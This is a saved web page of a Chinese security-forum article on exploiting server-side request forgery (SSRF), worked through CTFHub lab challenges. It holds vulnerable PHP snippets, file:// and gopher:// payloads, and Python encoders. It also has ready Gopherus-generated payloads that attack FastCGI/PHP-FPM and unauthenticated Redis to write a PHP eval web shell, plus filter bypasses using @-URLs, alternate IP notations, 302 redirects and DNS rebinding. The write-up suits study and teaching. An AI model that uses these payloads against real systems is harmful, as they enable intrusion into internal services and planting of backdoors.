<!DOCTYPE html>
<!-- saved from url=(0029)https://xz.aliyun.com/t/11215 -->
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <title>浅析SSRF的各种利用方式 - 先知社区</title>
    <meta name="description" content="先知社区，先知安全技术社区">
    <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no">
    <link rel="icon" href="https://xz.aliyun.com/static/icon/favicon.ico" type="image/x-icon">
    <link href="./浅析SSRF的各种利用方式 - 先知社区_files/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="./浅析SSRF的各种利用方式 - 先知社区_files/editormd.min.css">
    <link rel="stylesheet" href="./浅析SSRF的各种利用方式 - 先知社区_files/tango.css">
    <link href="./浅析SSRF的各种利用方式 - 先知社区_files/bootstrap-responsive.min.css" rel="stylesheet">
    <!-- Le styles -->
    <link rel="stylesheet" href="./浅析SSRF的各种利用方式 - 先知社区_files/OverlayStyle.css">
    <link rel="stylesheet" href="./浅析SSRF的各种利用方式 - 先知社区_files/topic.css">
    <link rel="stylesheet" href="./浅析SSRF的各种利用方式 - 先知社区_files/beautify.css">
    
    <link rel="stylesheet" href="./浅析SSRF的各种利用方式 - 先知社区_files/editormd.css">
    <link rel="stylesheet" href="./浅析SSRF的各种利用方式 - 先知社区_files/tango.css">
    <link rel="stylesheet" href="./浅析SSRF的各种利用方式 - 先知社区_files/jquery.fancybox.min.css">

    <!--[if lte IE 8]>
        <script src="http://code.jquery.com/jquery-1.11.3.min.js"></script>
    <![endif]-->
    
    

    <!--[if !IE]> -->
    <script type="text/javascript" src="./浅析SSRF的各种利用方式 - 先知社区_files/jquery-2.1.3.min.js.下载"></script>
    
    
    <script src="./浅析SSRF的各种利用方式 - 先知社区_files/jquery.fancybox.min.js.下载"></script>

    <!-- <![endif]-->
<style data-id="immersive-translate-input-injected-css">.immersive-translate-input {
  position: absolute;
  top: 0;
  right: 0;
  left: 0;
  bottom: 0;
  z-index: 2147483647;
  display: flex;
  justify-content: center;
  align-items: center;
}

.immersive-translate-input-loading {
  --loading-color: #f78fb6;
  width: 6px;
  height: 6px;
  border-radius: 50%;
  display: block;
  margin: 12px auto;
  position: relative;
  color: white;
  left: -100px;
  box-sizing: border-box;
  animation: immersiveTranslateShadowRolling 1.5s linear infinite;
}

@keyframes immersiveTranslateShadowRolling {
  0% {
    box-shadow: 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0);
  }

  12% {
    box-shadow: 100px 0 var(--loading-color), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0);
  }

  25% {
    box-shadow: 110px 0 var(--loading-color), 100px 0 var(--loading-color), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0);
  }

  36% {
    box-shadow: 120px 0 var(--loading-color), 110px 0 var(--loading-color), 100px 0 var(--loading-color), 0px 0 rgba(255, 255, 255, 0);
  }

  50% {
    box-shadow: 130px 0 var(--loading-color), 120px 0 var(--loading-color), 110px 0 var(--loading-color), 100px 0 var(--loading-color);
  }

  62% {
    box-shadow: 200px 0 rgba(255, 255, 255, 0), 130px 0 var(--loading-color), 120px 0 var(--loading-color), 110px 0 var(--loading-color);
  }

  75% {
    box-shadow: 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 130px 0 var(--loading-color), 120px 0 var(--loading-color);
  }

  87% {
    box-shadow: 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 130px 0 var(--loading-color);
  }

  100% {
    box-shadow: 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0);
  }
}
</style></head>
<body>
<!-- navbar begin -->
<div class="navbar navbar-default">
    <div class="navbar-inner">
        <div class="container" style="text-align: center; position:relative;">
            <!--[if lte IE 8]>
            <span style="display:inline-block;margin:0 auto;color:red;">为了更好的体验，请使用IE10及以上版本</span>
            <![endif]-->
            <div class="brand-box">
                <a class="brand" href="https://xz.aliyun.com/tab/1"></a>
            </div>
            
                <a href="https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F11215&amp;from_type=xianzhi" class="pull-right anonymous-user hh_loding">
                    登录</a>
            
            <div class="nav-collapse collapse">
                <div class="search d1 text-right">
                    <form method="get" action="https://xz.aliyun.com/search">
                        <input type="text" placeholder="搜索" name="keyword">
                    </form>
                </div>
            </div>
        </div>
    </div>
</div>
<!-- navbar end -->
<!-- main content begin -->
<div id="Wrapper" class="container">
    
    
    <div class="row2">
        <div class="span10">
            
    



    <script src="./浅析SSRF的各种利用方式 - 先知社区_files/jquery.toc.min.js.下载"></script>
    <script src="./浅析SSRF的各种利用方式 - 先知社区_files/toc.min.js.下载"></script>
    <script src="./浅析SSRF的各种利用方式 - 先知社区_files/dt.js.下载"></script>
    


<div class="row box content">
    
    <div class="box-container">
        <div class="main-topic">
            <div class="clearfix user-info topic-list">
                <p><span class="content-title ">浅析SSRF的各种利用方式</span>
                </p>
                <div class="topic-info">
                <span class="info-left">
                    <a href="https://xz.aliyun.com/u/46194">
                        <span class="username cell"> laodu</span></a> <span class="i-seprator"> / </span>
                    <span> 2022-04-18 23:14:01</span><span class="i-seprator"> / </span>
                    
                    <span>浏览数 12354</span>
                    
                    
                    <span class="content-node">
                    
                        <span class="label label-default label-node-first">
                            <a href="https://xz.aliyun.com/tab/1">技术文章</a></span>
                        <span class="label label-default">
                            <a href="https://xz.aliyun.com/node/11">技术文章</a></span>
                    
                    </span>
                </span>
                    <span class="pull-right t-vote cell info-right"><a class="vote vote-up" href="javascript:" onclick="voteUp(11215);">
             顶(0)</a>
             <a class="vote vote-down" href="javascript:" onclick="voteDown(11215);">
             踩(0)</a></span>
                </div>
            </div>
            <hr>
            <div id="topic_content" class="topic-content markdown-body">
                <h1>前言</h1>
<p>之前的时候，对SSRF的了解仅限与概念，至于具体的利用方法，和绕过，都是没有什么概念的，这一次，将之前没有学到的东西好好学习一下，总结一下。</p>
<h1>什么是SSRF</h1>
<p>SSRF(服务端请求伪造漏洞) 由于服务端提供了从其他服务器应用获取数据的功能,但又没有对目标地址做严格过滤与限制，导致攻击者可以传入任意的地址来让后端服务器对其发起请求,并返回对该目标地址请求的数据。</p>
<p>一般情况下，SSRF针对的都是一些外网无法访问的内网，所以需要SSRF使目标后端去访问内网，进而达到我们攻击内网的目的。</p>
<p><a id="img0" href="./浅析SSRF的各种利用方式 - 先知社区_files/image-20220409134112939.png"><img src="./浅析SSRF的各种利用方式 - 先知社区_files/image-20220409134112939.png"></a></p>
<p>通过SSRF，我们可以访问目标内网的redis服务，mysql服务，smpt服务，fastcgi服务等</p>
<p>造成漏洞的一些函数</p>
<p><code>file_get_contents()：将整个文件或一个url所指向的文件读入一个字符串中。</code></p>
<p><code>readfile()：输出一个文件的内容。</code></p>
<p><code>fsockopen()：打开一个网络连接或者一个Unix 套接字连接。</code></p>
<p><code>curl_exec()：初始化一个新的会话，返回一个cURL句柄，供curl_setopt()，curl_exec()和curl_close() 函数使用。</code></p>
<p><code>fopen()：打开一个文件文件或者 URL。</code></p>
<p><strong>file_get_contents()/readfile()</strong></p>

<pre><code>&lt;?php
$url = $_GET['url'];;
echo file_get_contents($url);
?&gt;</code></pre>
<p><strong>fsockopen()</strong></p>
<p><code>fsockopen($hostname,$port,$errno,$errstr,$timeout)</code>用于打开一个网络连接或者一个Unix  套接字连接，初始化一个套接字连接到指定主机（hostname），实现对用户指定url数据的获取。该函数会使用socket跟服务器建立tcp连接，进行传输原始数据。  fsockopen()将返回一个文件句柄，之后可以被其他文件类函数调用（例如：fgets()，fgetss()，fwrite()，fclose()还有feof()）。如果调用失败，将返回false</p>

<pre><code>&lt;?php
$host=$_GET['url'];
$fp = fsockopen($host, 80, $errno, $errstr, 30);
if (!$fp) {
    echo "$errstr ($errno)&lt;br /&gt;\n";
} else {
    $out = "GET / HTTP/1.1\r\n";
    $out .= "Host: $host\r\n";
    $out .= "Connection: Close\r\n\r\n";
    fwrite($fp, $out);
    while (!feof($fp)) {
        echo fgets($fp, 128);
    }
    fclose($fp);
}
?&gt;</code></pre>
<p><strong>curl_exec()</strong></p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span> 
<span class="nv">$url</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'url'</span><span class="p">];</span> 
<span class="nv">$ch</span><span class="o">=</span><span class="nb">curl_init</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>  <span class="c1">//创造一个curl资源</span>
<span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_HEADER</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span> <span class="c1">//设置url和相应的选项</span>
<span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span> 
<span class="nv">$result</span><span class="o">=</span><span class="nb">curl_exec</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span> <span class="c1">// 抓取url并将其传递给浏览器</span>
<span class="nb">curl_close</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span> <span class="c1">//关闭curl资源</span>
<span class="k">echo</span> <span class="p">(</span><span class="nv">$result</span><span class="p">);</span> 
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<p>接下来我就SSRF涉及的协议和一些bypass结合一些CTF进行分析</p>
<h2 id="toc-0">SSRF攻击中涉及的一些协议</h2>
<p>因为只是展示各个协议的用途，所以这里就不自己搭环境，直接用CTFHUB的技能树了</p>
<h3 id="toc-1">http协议</h3>
<p><strong>题目描述：</strong> 尝试访问位于127.0.0.1的flag.php吧</p>
<p><a id="img1" href="./浅析SSRF的各种利用方式 - 先知社区_files/image-20220409141604381.png"><img src="./浅析SSRF的各种利用方式 - 先知社区_files/image-20220409141604381.png"></a></p>
<p>payload： <code>?url=http://127.0.0.1/flag.php</code></p>
<p><a id="img2" href="./浅析SSRF的各种利用方式 - 先知社区_files/image-20220409150105393.png"><img src="./浅析SSRF的各种利用方式 - 先知社区_files/image-20220409150105393.png"></a></p>
<p>这就是因为过滤 不严谨，导致我们可以访问内网。</p>
<h3 id="toc-2">dict协议</h3>
<p><em>在SSRF中，dict协议与http协议可用来探测内网的主机存活与端口开放情况。</em></p>
<p><strong>题目描述：</strong> 来来来性感CTFHub在线扫端口,据说端口范围是8000-9000哦</p>
<p>通过题目应该可以判断 ，跟上一道题是差不多的，但是就是端口问题</p>
<p>先判断哪个端口存在web服务</p>
<p>这里是直接用burp爆破端口就可以</p>
<p><a id="img3" href="./浅析SSRF的各种利用方式 - 先知社区_files/image-20220409145235377.png"><img src="./浅析SSRF的各种利用方式 - 先知社区_files/image-20220409145235377.png"></a></p>
<p>但是我估计环境出问题了，一直没有爆破出想要的端口。</p>
<p>这里如果爆破出的话，直接访问就行</p>
<h3 id="toc-3">file伪协议</h3>
<p><strong>题目描述：</strong> 尝试去读取一下Web目录下的flag.php吧</p>
<p>file为协议就不用多说了</p>
<p>payload：<code>?url=file:/var/www/html/flag.php</code></p>
<p><a id="img4" href="./浅析SSRF的各种利用方式 - 先知社区_files/image-20220409145627309.png"><img src="./浅析SSRF的各种利用方式 - 先知社区_files/image-20220409145627309.png"></a></p>
<p>但是需要知道文件具体位置才能读到敏感信息。</p>
<h3 id="toc-4">Gopher协议</h3>
<p><em>Gopher是Internet上一个非常有名的信息查找系统，它将Internet 上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处如果发起post请求，回车换行需要使用%0d%0a，如果多个参数，参数之间的&amp;也需要进行URL编码</em><br>
<em>在SSRF中经常会使用Gopher来构造GET/POST包攻击应用。</em></p>
<p><strong>题目描述：</strong> 这次是发一个HTTP POST请求。对了，ssrf是用php的curl实现的。并且会跟踪302跳转，我准备了一个302.php，可能对你有用哦。</p>
<p>进入题目直接查看源码</p>
<p><code>?url=file:/var/www/html/flag.php 和 ?url=file:/var/www/html/index.php</code></p>
<p>index.php</p>

<pre><code>&lt;?php

error_reporting(0);

if (!isset($_REQUEST['url'])){
    header("Location: /?url=_");
    exit;
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $_REQUEST['url']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_exec($ch);
curl_close($ch);</code></pre>
<p>flag.php</p>

<pre><code>&lt;?php

error_reporting(0);

if ($_SERVER["REMOTE_ADDR"] != "127.0.0.1") {
    echo "Just View From 127.0.0.1";
    return;
}

$flag=getenv("CTFHUB");
$key = md5($flag);

if (isset($_POST["key"]) &amp;&amp; $_POST["key"] == $key) {
    echo $flag;
    exit;
}
?&gt;</code></pre>
<p>这里告诉我们要去用127.0.0.1访问flag.php</p>
<p><a id="img5" href="./浅析SSRF的各种利用方式 - 先知社区_files/image-20220409151445364.png"><img src="./浅析SSRF的各种利用方式 - 先知社区_files/image-20220409151445364.png"></a></p>
<p>那道key，看这个样子是要我们POST  key，但是提交页面又没有提交的按钮，所以这里就需要我们去本地新建一个POST</p>
<p><a id="img6" href="./浅析SSRF的各种利用方式 - 先知社区_files/image-20220409151616800.png"><img src="./浅析SSRF的各种利用方式 - 先知社区_files/image-20220409151616800.png"></a></p>
<p>这里我们需要构造一个POST的数据包</p>

<pre><code>gopher://127.0.0.1:80/_POST /flag.php HTTP/1.1
Host: 127.0.0.1:80
Content-Type: application/x-www-form-urlencoded
Content-Length: 36

key=00f001523d0b955749ea5e3b0ca09b5f</code></pre>
<p>然后我们就可以进行url编码了，编码次数取决于我们访问次数。</p>
<p>第一次编码：</p>

<pre><code>gopher://127.0.0.1:80/_POST%20/flag.php%20HTTP/1.1%0AHost:%20127.0.0.1:80%0AContent-Type:%20application/x-www-form-urlencoded%0AContent-Length:%2036%0A%0Akey=f1688c97bf2e6dda47be87e4d8f87cd7</code></pre>
<p>把%0A替换成%0d%0A，结尾加上%0d%0A,并且末尾要加上%0d%0a（\r\n）</p>

<pre><code>gopher://127.0.0.1:80/_POST%20/flag.php%20HTTP/1.1%0d%0AHost:%20127.0.0.1:80%0d%0AContent-Type:%20application/x-www-form-urlencoded%0d%0AContent-Length:%2036%0d%0A%0d%0Akey=f1688c97bf2e6dda47be87e4d8f87cd7%0d%0a</code></pre>
<p>然后在进行一次URL编码</p>

<pre><code>gopher%3A//127.0.0.1%3A80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252036%250D%250A%250D%250Akey%253Df1688c97bf2e6dda47be87e4d8f87cd7%250D%250A</code></pre>
<p><a id="img7" href="./浅析SSRF的各种利用方式 - 先知社区_files/image-20220409154707428.png"><img src="./浅析SSRF的各种利用方式 - 先知社区_files/image-20220409154707428.png"></a></p>
<p>当然手动编码，加上复杂的转化，错误率大大提高，所以，我在网上找了个脚本</p>

<pre><code>import urllib.parse
payload =\
"""POST /flag.php HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 36

key=c384d200658f258e5b5c681bf0aa29a8
"""  

#注意后面一定要有回车，回车结尾表示http请求结束
tmp = urllib.parse.quote(payload)
new = tmp.replace('%0A','%0D%0A')
result = 'gopher://127.0.0.1:80/'+'_'+new
result = urllib.parse.quote(result)
print(result)       # 这里因为是GET请求所以要进行两次url编码</code></pre>
<p>直接将编码所得，提交即可。</p>
<h3 id="toc-5">FastCGI协议</h3>
<p><strong>题目描述</strong>  ： 这次.我们需要攻击一下fastcgi协议咯.也许附件的文章会对你有点帮助</p>
<p>给了个附件介绍fastcgi协议和PHP-FPM</p>

<pre><code>FastCGI

Wikipedia对FastCGI的解释：快速通用网关接口（FastCommon Gateway Interface／FastCGI）是一种让交互程序与Web服务器通信的协议。FastCGI是早期通用网关接口（CGI）的增强版本。FastCGI致力于减少网页服务器与CGI程序之间交互的开销，从而使服务器可以同时处理更多的网页请求。

php-fpm

官方对php-fpm的解释是FPM（FastCGI 进程管理器）用于替换 PHP FastCGI 的大部分附加功能，对于高负载网站是非常有用的。也就是说php-fpm是FastCGI的一个具体实现，其默认监听9000端口</code></pre>
<p>这里，附件给的复现方式虽然已经挺好的了，但是我查阅资料后，发现还有第二种做法，而且相对简单，我就用第二种做法，复现一下。</p>
<p>使用工具 <a href="https://github.com/tarunkant/Gopherus" target="_blank">Gopherus</a> 生成攻击FastCGI协议的payload</p>

<pre><code>python gopherus.py --exploit fastcgi
/var/www/html/index.php                 # 这里输入的是一个已知存在的php文件
echo PD9waHAgZXZhbCgkX1BPU1Rbd2hvYW1pXSk7Pz4 | base64 -d &gt; /var/www/html/shell.php</code></pre>
<p><a id="img8" href="./浅析SSRF的各种利用方式 - 先知社区_files/image-20220410134148700.png"><img src="./浅析SSRF的各种利用方式 - 先知社区_files/image-20220410134148700.png"></a></p>
<p>这里我直接参考师傅的payload，生成的payload</p>

<pre><code>gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%07%07%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH134%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%19SCRIPT_FILENAME/var/www/html/index.php%20%20%0D%01DOCUMENT_ROOT/%00%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%86%04%00%3C%3Fphp%20system%28%27echo%20PD9waHAgZXZhbCgkX1BPU1Rbd2hvYW1pXSk7Pz4%20%7C%20base64%20-d%20%3E%20/var/www/html/shell.php%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00</code></pre>
<p>这里对其进行url二次编码，因为url会对其解码一次，curl也会解码一次，所以要编码两次。这个payload是已经进行过一次编码的，所以再编码一次即可。</p>

<pre><code>gopher%3A//127.0.0.1%3A9000/_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2505%2505%2500%250F%2510SERVER_SOFTWAREgo%2520/%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP/1.1%250E%2503CONTENT_LENGTH134%250E%2504REQUEST_METHODPOST%2509KPHP_VALUEallow_url_include%2520%253D%2520On%250Adisable_functions%2520%253D%2520%250Aauto_prepend_file%2520%253D%2520php%253A//input%250F%2517SCRIPT_FILENAME/var/www/html/index.php%250D%2501DOCUMENT_ROOT/%2500%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%2500%2586%2504%2500%253C%253Fphp%2520system%2528%2527echo%2520PD9waHAgZXZhbCgkX1BPU1Rbd2hvYW1pXSk7Pz4%2520%257C%2520base64%2520-d%2520%253E%2520/var/www/html/shell.php%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500</code></pre>
<p>然后上传成功</p>
<p><a id="img9" href="./浅析SSRF的各种利用方式 - 先知社区_files/image-20220410134857049.png"><img src="./浅析SSRF的各种利用方式 - 先知社区_files/image-20220410134857049.png"></a></p>
<p>蚁剑连接shell</p>
<p><a id="img10" href="./浅析SSRF的各种利用方式 - 先知社区_files/image-20220410135130186.png"><img src="./浅析SSRF的各种利用方式 - 先知社区_files/image-20220410135130186.png"></a></p>
<p>连接成功，并在根目录找到flag</p>
<h3 id="toc-6">Redis协议</h3>
<p><strong>题目描述</strong> ： 这次来攻击redis协议吧，redis://127.0.0.1:6379。资料？没有资料！自己找！</p>
<p>总所周知，redis服务是开在6379端口，通常是利用redis未授权访问而达到写入shell或者反弹ssh等目的。</p>
<p>这里我本来想着用gopherus 直接生成针对redis未授权访问，写入shell</p>
<p><a id="img11" href="./浅析SSRF的各种利用方式 - 先知社区_files/image-20220410140604901.png"><img src="./浅析SSRF的各种利用方式 - 先知社区_files/image-20220410140604901.png"></a></p>

<pre><code>gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2430%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_POST%5B%271%27%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A</code></pre>
<p>但是二次编码的时候传入没有成功，不知道为什么。这里我还是用whoami师傅的方法来打。</p>
<p>构造redis命令：</p>

<pre><code>flushall
set 1 '&lt;?php eval($_POST["whoami"]);?&gt;'
config set dir /var/www/html
config set dbfilename shell.php
save</code></pre>
<p>WHOAMI师傅的EXP脚本：</p>

<pre><code>import urllib
protocol="gopher://"
ip="127.0.0.1"
port="6379"
shell="\n\n&lt;?php eval($_POST[\"whoami\"]);?&gt;\n\n"
filename="shell.php"
path="/var/www/html"
passwd=""
cmd=["flushall",
"set 1 {}".format(shell.replace(" ","${IFS}")),
"config set dir {}".format(path),
"config set dbfilename {}".format(filename),
"save"
]
if passwd:
cmd.insert(0,"AUTH {}".format(passwd))
payload=protocol+ip+":"+port+"/_"
def redis_format(arr):
CRLF="\r\n"
redis_arr = arr.split(" ")
cmd=""
cmd+="*"+str(len(redis_arr))
for x in redis_arr:
cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")
cmd+=CRLF
return cmd
​
if __name__=="__main__":
for x in cmd:
payload += urllib.quote(redis_format(x))
print urllib.quote(payload)    # 由于我们这里是GET，所以要进行两次url编
码</code></pre>
<p>生成如下payload</p>

<pre><code>gopher%3A//127.0.0.1%3A6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252435%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524_POST%255B%2522whoami%2522%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A/var/www/html%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A</code></pre>
<p>get传值，蚁剑连接。</p>
<p><a id="img12" href="./浅析SSRF的各种利用方式 - 先知社区_files/image-20220410142312903.png"><img src="./浅析SSRF的各种利用方式 - 先知社区_files/image-20220410142312903.png"></a></p>
<p>但是我这一直报错，就很怪</p>
<h2 id="toc-7">常见的bypass绕过方式</h2>
<p>这里依旧用ctfhub的题目，但是绕过方法，我会就buu和ctfshow 的相关题目进行扩展。</p>
<h3 id="toc-8">URL    Bypass</h3>
<p><strong>题目描述</strong> ： 请求的URL中必须包含<a href="http://notfound.ctfhub.xn--com%2Curl-cu3kgmt1b46xwel2xzyliss1i0bw6f4zut74aohl52gom5cvq0d71t4mal84l/" target="_blank">http://notfound.ctfhub.com，来尝试利用URL的一些特殊地方绕过这个限制吧</a></p>
<p>构造payload：</p>

<pre><code>?url=http://notfound.ctfhub.com@127.0.0.1/flag.php</code></pre>
<p>扩展：如果要求以<code>http://notfound.ctfhub</code>开头<code>.com</code> 结尾的话，依旧可以使用@</p>
<p>payload</p>
<p><code>?url=http://notfound.ctfhub@127.0.0.1/flag.php.com</code></p>
<p>此类需要某某开头 某某结束的题目均可使用@进行绕过。</p>
<h3 id="toc-9">数字IP Bypass</h3>
<p><strong>题目描述</strong> :这次ban掉了127以及172.不能使用点分十进制的IP了。但是又要访问127.0.0.1。该怎么办呢</p>
<p>不能使用<code>127/172</code> 我们可以使用进制转换等</p>

<pre><code>进制转换
url=http://0x7f.0.0.1/flag.php
url=http://0177.0.0.1/flag.php
扩展：
当有的对跳转的地址的长度有要求
host&lt;5
url=http://0/flag.php
url=http://127.1/flag.php
host&lt;3
url=http://0/flag.php</code></pre>
<h3 id="toc-10">302跳转 Bypass</h3>
<p><strong>题目描述</strong>：SSRF中有个很重要的一点是请求可能会跟随302跳转，尝试利用这个来绕过对IP的检测访问到位于127.0.0.1的flag.php吧</p>
<p>302跳转就是由一个URL跳转到另外一个URL当中去。</p>
<p><a id="img13" href="./浅析SSRF的各种利用方式 - 先知社区_files/image-20220410150952514.png"><img src="./浅析SSRF的各种利用方式 - 先知社区_files/image-20220410150952514.png"></a></p>
<p>IP被ban，改个不含127的试试</p>
<p>出了，我甚至没搞明白啥意思，有点懵。</p>
<h3 id="toc-11">DNS重绑定 Bypass</h3>
<p><strong>题目描述</strong> ：无</p>
<p><code>DNS重绑定DNS Rebinding攻击在网页浏览过程中，用户在地址栏中输入包含域名的网址。浏览器通过DNS服务器将域名解析为IP地址，然后向对应的IP地址请求资源，最后展现给用户。而对于域名所有者，他可以设置域名所对应的IP地址。当用户第一次访问，解析域名获取一个IP地址；然后，域名持有者修改对应的IP地址；用户再次请求该域名，就会获取一个新的IP地址。对于浏览器来说，整个过程访问的都是同一域名，所以认为是安全的。这就造成了DNS Rebinding攻击。</code></p>
<p>在自己服务器上写一个index.php内容如下：</p>

<pre><code>&lt;?php
header("Location:http://127.0.0.1/flag.php");</code></pre>
<p>然后payload访问自己这个地址就可以了。</p>
<p>或者也可以利用这个网站获取一个测试用的域名：<a href="https://lock.cmpxchg8b.com/rebinder.html" target="_blank">https://lock.cmpxchg8b.com/rebinder.html</a></p>
<p><a id="img14" href="./浅析SSRF的各种利用方式 - 先知社区_files/image-20220410152735132.png"><img src="./浅析SSRF的各种利用方式 - 先知社区_files/image-20220410152735132.png"></a></p>
<p>直接访问</p>
<p><a id="img15" href="./浅析SSRF的各种利用方式 - 先知社区_files/image-20220410152810623.png"><img src="./浅析SSRF的各种利用方式 - 先知社区_files/image-20220410152810623.png"></a></p>
<p>需要访问多次，因为这个域名会在两个ip之间跳转。</p>
<h1>总结</h1>
<p>虽然这篇文章都是基于CTF来分析SSRF相关知识的，但是我觉得可以从这些CTF题目中延伸出一些渗透攻击的思路。</p>
<p>就比如：如果我们发现一处SSRF，我们可以使用使用<code>file</code> 伪协议读取敏感信息，http/s和dict<code>协议判断内网存活主机和端口，从端口判断内网中存在的服务。</code></p>
<p>当我们发现<code>redis/fastcgi/mysql</code>等服务时， 我们可以利用协议<code>gopher</code>和工具 <code>gopherus</code> 进行getshell。</p>
<p><a id="img16" href="./浅析SSRF的各种利用方式 - 先知社区_files/image-20220410160331815.png"><img src="./浅析SSRF的各种利用方式 - 先知社区_files/image-20220410160331815.png"></a></p>
<h1>参考</h1>
<p><a href="http://www.qwzf.top/2020/03/21/SSRF%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8/" target="_blank">http://www.qwzf.top/2020/03/21/SSRF%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8/</a></p>
<p><a href="https://www.freebuf.com/articles/web/258365.html" target="_blank">https://www.freebuf.com/articles/web/258365.html</a></p>
<p><a href="https://blog.csdn.net/qq_49422880/article/details/117166929" target="_blank">https://blog.csdn.net/qq_49422880/article/details/117166929</a></p>
<p><a href="https://www.freebuf.com/articles/web/260806.html" target="_blank">https://www.freebuf.com/articles/web/260806.html</a></p>

            </div>
            

            <div class="post-user-action" style="margin-top: 34px;">
                <span class="btn btn-default pull-right" id="mark" data-action="topic" data-pk="11215">
                    <span id="mark-text">点击收藏 </span><span class="i-seprator"> | </span><span id="mark-count">5</span>
                </span>
                
                    <span class="btn btn-default pull-right" id="follow_topic" data-pk="11215">
                     <span>关注</span><span class="i-seprator"> | </span><span id="follow-count">1</span>
                    </span>
                
                <div class="clearfix"></div>
            </div>
            
                <div class="related-section">
                    <div class="related-box">
                        
                            <span><a class="pull-left" href="https://xz.aliyun.com/t/11208" title="springboot snakeyaml利用浅析"><span class="related-label" style="padding: 3px 4px;margin-right: 3px;">上一篇：</span>springboot snakey...</a></span>
                        
                        
                            <span><a class="pull-left" href="https://xz.aliyun.com/t/11225" title="一次adminer之旅"><span class="related-label" style="">下一篇：</span>一次adminer之旅</a></span>
                        
                    </div>
                </div>
            
        </div>
    </div>
</div>

    <!-- topic & appendix -->
    



<div class="row box">
    <ol class="breadcrumb">
        <li class="active">2 条回复</li>
    </ol>
    <div class="box-container post-container">
        
            
                <ul class="post-info" id="reply-18152">
                    <li>
                        <div class="row1 user-info clearfix">
                            
